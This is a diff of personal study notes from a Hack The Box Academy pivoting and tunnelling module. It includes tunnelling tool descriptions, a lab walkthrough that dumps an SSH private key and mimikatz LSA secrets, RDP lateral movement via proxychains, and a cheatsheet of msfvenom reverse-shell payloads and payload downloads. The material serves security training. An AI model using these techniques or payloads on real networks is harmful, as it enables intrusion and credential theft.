@@ -973,7 +973,7 @@ An OID represents a node in a hierarchical namespace. A sequence of numbers uniq
 
 **Dangerous Settings**
 | Settings | Description |
-| ---------------------------------------------- | ------------------------------------------------------------------------------------- |
+| -------------------------------------------------- | ------------------------------------------------------------------------------------- |
 | rwuser noauth | Provides access to the full OID tree without authentication. |
 | rwcommunity \<community string\> \<IPv4 address\> | Provides access to the full OID tree regardless of where the requests were sent from. |
 | rwcommunity6 \<community string\> \<IPv6 address\> | Same access as with rwcommunity with the difference of using IPv6. |
@@ -1689,7 +1689,7 @@ Laudanum is a repository of ready-made files that can be used to inject onto a v
 | `search <name>`                                  | Search for exploits or modules within the Framework.                                                                                              |
 | `info`                                           | Load information about a specific exploit or module.                                                                                              |
 | `use <name>`                                     | Load an exploit or module (example: use windows/smb/psexec).                                                                                      |
-| `use <number>`                                   | Load an exploit by using the index number displayed after the search \<name\> command.                                                              |
+| `use <number>`                                   | Load an exploit by using the index number displayed after the search \<name\> command.                                                            |
 | `LHOST`                                          | Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells. |
 | `RHOST`                                          | The remote host or the target. set function Set a specific value (for example, LHOST or RHOST).                                                   |
 | `setg <function>`                                | Set a specific value globally (for example, LHOST or RHOST).                                                                                      |
@@ -2615,7 +2615,7 @@ The `-L` command tells the SSH client to request the SSH server to forward all t
 ```sh
 woadey@htb[/htb]$ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
 
-ubuntu@10.129.202.64's password: 
+ubuntu@10.129.202.64's password:
 Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -2707,7 +2707,7 @@ ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
 [Sshuttle](https://github.com/sshuttle/sshuttle) is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers. `Sshuttle` can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the Ubuntu server as a pivot point and route all of Nmap's network traffic with sshuttle using the example later in this section.
 
 ```sh
-woadey@htb[/htb]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
+woadey@htb[/htb]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
 
 Starting sshuttle proxy (version 1.1.0).
 c : Starting firewall manager with command: ['/usr/bin/python3', '/usr/local/lib/python3.9/dist-packages/sshuttle/__main__.py', '-v', '--method', 'auto', '--firewall']
@@ -2729,7 +2729,7 @@ c : TCP redirector listening on ('::1', 12300, 0, 0).
 c : TCP redirector listening on ('127.0.0.1', 12300).
 c : Starting client with Python version 3.9.2
 c : Connecting to server...
-ubuntu@10.129.202.64's password: 
+ubuntu@10.129.202.64's password:
  s: Running server on remote host with /usr/bin/python3 (version 3.8.10)
  s: latency control setting = True
  s: auto-nets:False
@@ -2753,3 +2753,365 @@ fw: iptables -w -t nat -A sshuttle-12300 -j REDIRECT --dest 172.16.5.0/32 -p tcp
 ```sh
 woadey@htb[/htb]$ nmap -v -sV -p3389 172.16.5.19 -A -Pn
 ```
+
+### DNS Tunneling with Dnscat2
+
+[Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted `Command-&-Control` (`C&C` or `C2`) channel and sends data inside TXT records within the DNS protocol. Usually, every active directory domain environment in a corporate network will have its own DNS server, which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating in the overarching DNS system. However, with dnscat2, the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic. For our testing example, we can use dnscat2 server on our attack host, and execute the dnscat2 client on another Windows host.
+
+### SOCKS5 Tunneling with Chisel
+
+[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data that is secured using SSH. `Chisel` can create a client-server tunnel connection in a firewall restricted environment.
+
+### ICMP Tunneling with SOCKS
+
+ICMP tunneling encapsulates your traffic within ICMP packets containing echo requests and responses. ICMP tunneling would only work when ping responses are permitted within a firewalled network. When a host within a firewalled network is allowed to ping an external server, it can encapsulate its traffic within the ping echo request and send it to an external server. The external server can validate this traffic and send an appropriate response, which is extremely useful for data exfiltration and creating pivot tunnels to an external server. [ptunnel-ng](https://github.com/utoni/ptunnel-ng) is a great tool that allows us to do this.
+
+### Skill Assessment
+
+IP: 10.129.208.79
+
+```sh
+www-data@inlanefreight.local:…/www/html# ifconfig
+ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.129.208.79  netmask 255.255.0.0  broadcast 10.129.255.255
+        inet6 dead:beef::250:56ff:feb9:e9df  prefixlen 64  scopeid 0x0<global>
+        inet6 fe80::250:56ff:feb9:e9df  prefixlen 64  scopeid 0x20<link>
+        ether 00:50:56:b9:e9:df  txqueuelen 1000  (Ethernet)
+        RX packets 1531  bytes 137646 (137.6 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 588  bytes 77641 (77.6 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.16.5.15  netmask 255.255.0.0  broadcast 172.16.255.255
+        inet6 fe80::250:56ff:feb9:b964  prefixlen 64  scopeid 0x20<link>
+        ether 00:50:56:b9:b9:64  txqueuelen 1000  (Ethernet)
+        RX packets 332  bytes 21095 (21.0 KB)
+        RX errors 0  dropped 13  overruns 0  frame 0
+        TX packets 13  bytes 1006 (1.0 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 1742  bytes 136860 (136.8 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1742  bytes 136860 (136.8 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+www-data@inlanefreight.local:…/www/html# netstat -antp
+(No info could be read for "-p": geteuid()=33 but you should be root.)
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      1 10.129.208.79:34878     1.1.1.1:53              SYN_SENT    -
+tcp        0      1 10.129.208.79:49512     8.8.8.8:53              SYN_SENT    -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+tcp6       0      0 10.129.208.79:80        10.10.14.247:53140      TIME_WAIT   -
+tcp6       0      0 10.129.208.79:80        10.10.14.247:37476      ESTABLISHED -
+
+
+www-data@inlanefreight.local:/home/webadmin# cat for-admin-eyes-only
+# note to self,
+in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay
+with a password of :
+Plain Human work!
+
+www-data@inlanefreight.local:/home/webadmin# cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+```
+
+```sh
+┌─[us-academy-2]─[10.10.14.247]─[htb-ac-713396@htb-gxwarb3erc]─[~]
+└──╼ [★]$ ssh webadmin@10.129.208.79 -i www.rsa
+```
+
+```sh
+webadmin@inlanefreight:~$ for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.026 ms
+64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=0.533 ms
+```
+
+```sh
+┌─[us-academy-2]─[10.10.14.247]─[htb-ac-713396@htb-gxwarb3erc]─[~]
+└──╼ [★]$ sudo sshuttle -r webadmin@10.129.208.79 172.16.5.0/23 -v --ssh-cmd 'ssh -i www.rsa'
+
+┌─[us-academy-2]─[10.10.14.247]─[htb-ac-713396@htb-gxwarb3erc]─[~]
+└──╼ [★]$ ssh mlefay@172.16.5.35
+The authenticity of host '172.16.5.35 (172.16.5.35)' can't be established.
+ECDSA key fingerprint is SHA256:eLsiZMYLSL7ZU18y5e5UweyshW/D9MJ2Rq4XuUqO/wc.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '172.16.5.35' (ECDSA) to the list of known hosts.
+mlefay@172.16.5.35's password: Plain Human work!
+
+Microsoft Windows [Version 10.0.17763.2628]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+mlefay@PIVOT-SRV01 C:\Users\mlefay> exit
+
+┌─[us-academy-2]─[10.10.14.247]─[htb-ac-713396@htb-gxwarb3erc]─[~]
+└──╼ [★]$ scp mimikatz.exe mlefay@172.16.5.35:"C:\\Users\\mlefay\\"
+mlefay@172.16.5.35's password: Plain Human work!
+mimikatz.exe                                                  100% 1324KB   7.1MB/s   00:00
+```
+
+```cmd
+mlefay@PIVOT-SRV01 C:\Users\mlefay>type C:\Flag.txt
+S1ngl3-Piv07-3@sy-Day
+
+mlefay@PIVOT-SRV01 C:\Users\mlefay>ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::f084:7265:ec5f:bebe%4
+   IPv4 Address. . . . . . . . . . . : 172.16.5.35
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : 172.16.5.1
+
+Ethernet adapter Ethernet1 2:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::5d78:ecf:b016:4434%5
+   IPv4 Address. . . . . . . . . . . : 172.16.6.35
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . :
+
+
+mlefay@PIVOT-SRV01 C:\Users\mlefay>mimikatz.exe
+
+mimikatz # lsadump::secrets
+Domain : PIVOT-SRV01
+SysKey : eeefe7d6277a2ae258b4e571104cc289
+
+Local name : PIVOT-SRV01 ( S-1-5-21-1602415334-2376822715-119304339 )
+Domain name : INLANEFREIGHT ( S-1-5-21-3858284412-1730064152-742000644 )
+Domain FQDN : INLANEFREIGHT.LOCAL
+
+Policy subsystem is : 1.18
+LSA Key(s) : 1, default {a4bf8c79-68b8-b086-46df-dc85da69e0c8}
+  [00] {a4bf8c79-68b8-b086-46df-dc85da69e0c8} 39e6b5c93fa7690b499f6e6119a904d2bff37d9ed24d0b61bee460c1a7bd031d
+
+
+Secret  : $MACHINE.ACC
+cur/text: z4PN$Qc?h1n'mI`r<dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW^LMUKkPQb!(P9\<$VDLWL+UL4KDZ&lh^Z_[OEj;
+Is4= 1GOR+3h<U/a[Q7#
+    NTLM:21ce18b1a025d4b0b01c0e716e99d476
+    SHA1:0f6097d8c745b1addfdfbbe733c1948e5d929527
+old/text: z4PN$Qc?h1n'mI`r<dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW^LMUKkPQb!(P9\<$VDLWL+UL4KDZ&lh^Z_[OEj;
+Is4= 1GOR+3h<U/a[Q7#
+    NTLM:21ce18b1a025d4b0b01c0e716e99d476
+    SHA1:0f6097d8c745b1addfdfbbe733c1948e5d929527
+
+Secret  : DPAPI_SYSTEM
+cur/hex : 01 00 00 00 2c 1b ed 0e 34 6a f0 6d 64 c3 2d cf d1 08 d8 fb 3a f1 e3 53 8a 88 8d cf 7b ec c6 9d 40 6
+5 ca f2 6b 6a 53 4a b1 60 14 4c
+    full: 2c1bed0e346af06d64c32dcfd108d8fb3af1e3538a888dcf7becc69d4065caf26b6a534ab160144c
+    m/u : 2c1bed0e346af06d64c32dcfd108d8fb3af1e353 / 8a888dcf7becc69d4065caf26b6a534ab160144c
+old/hex : 01 00 00 00 51 9c 86 b4 cb dc 97 8b 35 9b c0 39 17 34 16 62 31 98 c1 07 ce 7d 9f 94 fc e7 2c d9 59 8
+a c6 07 10 78 7c 0d 9a 56 ce 0b
+    full: 519c86b4cbdc978b359bc039173416623198c107ce7d9f94fce72cd9598ac60710787c0d9a56ce0b
+    m/u : 519c86b4cbdc978b359bc039173416623198c107 / ce7d9f94fce72cd9598ac60710787c0d9a56ce0b
+
+Secret  : NL$KM
+cur/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 ff ca 5c f4 e5 a0 38 94 14 91 6
+4 fa c7 91 d2 0e 02 7a d6 52 53 b4 f4 a9 6f 58 ca 76 00 dd 39 01 7d c5 f7 8f 4b ab 1e dc 63
+old/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 ff ca 5c f4 e5 a0 38 94 14 91 6
+4 fa c7 91 d2 0e 02 7a d6 52 53 b4 f4 a9 6f 58 ca 76 00 dd 39 01 7d c5 f7 8f 4b ab 1e dc 63
+
+Secret  : _SC_DHCPServer / service 'DHCPServer' with username : INLANEFREIGHT\vfrank
+cur/text: Imply wet Unmasked!
+old/text: Imply wet Unmasked!
+
+Secret  : _SC_SCardSvr / service 'SCardSvr' with username : INLANEFREIGHT\vfrank
+cur/text: Imply wet Unmasked!
+
+
+
+mimikatz #exit
+
+mlefay@PIVOT-SRV01 C:\Users\mlefay>for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
+...
+SNIP
+...
+mlefay@PIVOT-SRV01 C:\Users\mlefay>ping 172.16.6.35 -n 1 -w 100   | find "Reply"
+Reply from 172.16.6.35: bytes=32 time<1ms TTL=128
+```
+
+172.16.5.35 - C:\\Flag.txt: `S1ngl3-Piv07-3@sy-Day`
+
+Found: `INLANEFREIGHT\vfrank:Imply wet Unmasked!` and the IP `172.16.6.35`
+
+```console
+C:\Users\vfrank>for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find "Reply"
+...
+C:\Users\vfrank>ping 172.16.6.25 -n 1 -w 100   | find "Reply"
+Reply from 172.16.6.25: bytes=32 time<1ms TTL=128
+...
+C:\Users\vfrank>ping 172.16.6.35 -n 1 -w 100   | find "Reply"
+Reply from 172.16.6.35: bytes=32 time<1ms TTL=128
+...
+C:\Users\vfrank>ping 172.16.6.45 -n 1 -w 100   | find "Reply"
+Reply from 172.16.6.45: bytes=32 time=1ms TTL=64
+```
+
+```sh
+┌─[us-academy-2]─[10.10.14.247]─[htb-ac-713396@htb-zjez6mclrz]─[~]
+└──╼ [★]$ proxychains xfreerdp /v:172.16.6.25 /u:"INLANEFREIGHT\vfrank" /p:"Imply wet Unmasked!"
+```
+
+```console
+C:\Users\vfrank>type C:\\Flag.txt
+N3tw0rk-H0pp1ng-f0R-FuN
+
+
+
+C:\Users\vfrank>ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::d05f:823d:172b:595%9
+   IPv4 Address. . . . . . . . . . . : 172.16.6.25
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : 172.16.6.1
+
+Ethernet adapter Ethernet1 2:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::cd46:a4fe:f119:c745%4
+   IPv4 Address. . . . . . . . . . . : 172.16.10.25
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . :
+
+
+C:\Users\vfrank>for /L %i in (1 1 254) do ping 172.16.10.%i -n 1 -w 100 | find "Reply"
+...
+C:\Users\vfrank>ping 172.16.10.5 -n 1 -w 100   | find "Reply"
+Reply from 172.16.10.5: bytes=32 time<1ms TTL=128
+```
+
+172.16.6.25 - C:\\Flag.txt: `N3tw0rk-H0pp1ng-f0R-FuN`
+
+### Cheatsheet
+
+| Command                                                                                                                                                                                                            | Description                                                                                                                                                                                                                                                             |
+| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `ifconfig`                                                                                                                                                                                                         | Linux-based command that displays all current network configurations of a system.                                                                                                                                                                                       |
+| `ipconfig`                                                                                                                                                                                                         | Windows-based command that displays all system network configurations.                                                                                                                                                                                                  |
+| `netstat -r`                                                                                                                                                                                                       | Command used to display the routing table for all IPv4-based protocols.                                                                                                                                                                                                 |
+| `nmap -sT -p22,3306 <IPaddressofTarget>`                                                                                                                                                                           | Nmap command used to scan a target for open ports allowing SSH or MySQL connections.                                                                                                                                                                                    |
+| `ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget>`                                                                                                                                                            | SSH comand used to create an SSH tunnel from a local machine on local port 1234 to a remote target using port 3306.                                                                                                                                                     |
+| `netstat -antp \| grep 1234`                                                                                                                                                                                       | Netstat option used to display network connections associated with a tunnel created. Using grep to filter based on local port 1234.                                                                                                                                     |
+| `nmap -v -sV -p1234 localhost`                                                                                                                                                                                     | Nmap command used to scan a host through a connection that has been made on local port 1234.                                                                                                                                                                            |
+| `ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<IPaddressofTarget>`                                                                                                                                          | SSH command that instructs the ssh client to request the SSH server forward all data via port 1234 to localhost:3306.                                                                                                                                                   |
+| `ssh -D 9050 ubuntu@<IPaddressofTarget>`                                                                                                                                                                           | SSH command used to perform a dynamic port forward on port 9050 and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.                                                                                                                |
+| `tail -4 /etc/proxychains.conf`                                                                                                                                                                                    | Linux-based command used to display the last 4 lines of /etc/proxychains.conf. Can be used to ensure socks configurations are in place.                                                                                                                                 |
+| `proxychains nmap -v -sn 172.16.5.1-200`                                                                                                                                                                           | Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range 172.16.5.1-200 with increased verbosity (-v) disabling ping scan (-sn).                                                |
+| `proxychains nmap -v -Pn -sT 172.16.5.19`                                                                                                                                                                          | Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (-v), disabling ping discover (-Pn), and using TCP connect scan type (-sT).                                        |
+| `proxychains msfconsole`                                                                                                                                                                                           | Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy.                                                                                                                                                                       |
+| `msf6 > search rdp_scanner`                                                                                                                                                                                        | Metasploit search that attempts to find a module called rdp\*scanner.                                                                                                                                                                                                   |
+| `proxychains xfreerdp /v:<IPaddressofTarget> /u:victor /p:pass@123`                                                                                                                                                | Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy.                                                                                                                                     |
+| `msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080`                                                                                            | Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following lhost= on local port 8080 (LPORT=8080). Payload will take the form of an executable file called backupscript.exe.          |
+| `msf6 > use exploit/multi/handler`                                                                                                                                                                                 | Used to select the multi-handler exploit module in Metasploit.                                                                                                                                                                                                          |
+| `scp backupscript.exe ubuntu@<ipAddressofTarget>:~/`                                                                                                                                                               | Uses secure copy protocol (scp) to transfer the file backupscript.exe to the specified host and places it in the Ubuntu user's home directory (:~/).                                                                                                                    |
+| `python3 -m http.server 8123`                                                                                                                                                                                      | Uses Python3 to start a simple HTTP server listening on port 8123. Can be used to retrieve files from a host.                                                                                                                                                           |
+| `Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"`                                                                                                                | PowerShell command used to download a file called backupscript.exe from a webserver (172.16.5.129:8123) and then save the file to location specified after -OutFile.                                                                                                    |
+| `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@<ipAddressofTarget> -vN`                                                                                                                                    | SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port 8080 on the attack host to port 80 on the target.                                                                                                         |
+| `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IPaddressofAttackHost -f elf -o backupjob LPORT=8080`                                                                                                        | Uses msfveom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after LHOST= on port 8080 (LPORT=8080). Payload takes the form of an executable elf file called backupjob.                                                   |
+| `msf6> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`                                                                                                                                                      | Metasploit command that runs a ping sweep module against the specified network segment (RHOSTS=172.16.5.0/23).                                                                                                                                                          |
+| `for i in {1..254} ;do (ping -c 1 172.16.5.$i \| grep "bytes from" &) ;done`                                                                                                                                       | For Loop used on a Linux-based system to discover devices in a specified network segment.                                                                                                                                                                               |
+| `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \| find "Reply"`                                                                                                                                           | For Loop used on a Windows-based system to discover devices in a specified network segment.                                                                                                                                                                             |
+| `1..254 \| % {"172.16.5.$($*): $(Test-Connection -count 1 -comp 172.15.5.$($\_) -quiet)"}`                                                                                                                         | PowerShell one-liner used to ping addresses 1 - 254 in the specified network segment.                                                                                                                                                                                   |
+| `msf6 > use auxiliary/server socks_proxy`                                                                                                                                                                          | Metasploit command that selects the socks_proxy auxiliary module.                                                                                                                                                                                                       |
+| `msf6 auxiliary(server/socks_proxy) > jobs`                                                                                                                                                                        | Metasploit command that lists all currently running jobs.                                                                                                                                                                                                               |
+| `socks4 127.0.0.1 9050`                                                                                                                                                                                            | Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port.                                                                                              |
+| `Socks5 127.0.0.1 1080`                                                                                                                                                                                            | Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 5 proxy is used                                                                                                                                                                    |
+| `msf6 > use post/multi/manage/autoroute`                                                                                                                                                                           | Metasploit command used to select the autoroute module.                                                                                                                                                                                                                 |
+| `meterpreter > help portfwd`                                                                                                                                                                                       | Meterpreter command used to display the features of the portfwd command.                                                                                                                                                                                                |
+| `meterpreter > portfwd add -l 3300 -p 3389 -r <IPaddressofTarget>`                                                                                                                                                 | Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target.                                                                |
+| `xfreerdp /v:localhost:3300 /u:victor /p:pass@123`                                                                                                                                                                 | Uses xfreerdp to connect to a remote host through localhost:3300 using a set of credentials. Port forwarding rules must be in place for this to work properly.                                                                                                          |
+| `netstat -antp`                                                                                                                                                                                                    | Used to display all (-a) active network connections with associated process IDs. -t displays only TCP connections.-n displays only numerical addresses. -p displays process IDs associated with each displayed connection.                                              |
+| `meterpreter > portfwd add -R -l 8081 -p 1234 -L <IPaddressofAttackHost>`                                                                                                                                          | Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port 1234 listening on the IP address of the Attack Host.                                                                                              |
+| `meterpreter > bg`                                                                                                                                                                                                 | Meterpreter-based command used to run the selected metepreter session in the background. Similar to background a process in Linux                                                                                                                                       |
+| `socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofAttackHost>:80`                                                                                                                                                      | Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80.                                                                                                                                 |
+| `socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofTarget>:8443`                                                                                                                                                        | Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443.                                                                                                                               |
+| `plink -D 9050 ubuntu@<IPaddressofTarget>`                                                                                                                                                                         | Windows-based command that uses PuTTY's Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host. |
+| `sudo apt-get install sshuttle`                                                                                                                                                                                    | Uses apt-get to install the tool sshuttle.                                                                                                                                                                                                                              |
+| `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v`                                                                                                                                                              | Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (172.16.5.0).                                                                                       |
+| `sudo git clone https://github.com/klsecservices/rpivot.git`                                                                                                                                                       | Clones the rpivot project GitHub repository.                                                                                                                                                                                                                            |
+| `sudo apt-get install python2.7`                                                                                                                                                                                   | Uses apt-get to install python2.7.                                                                                                                                                                                                                                      |
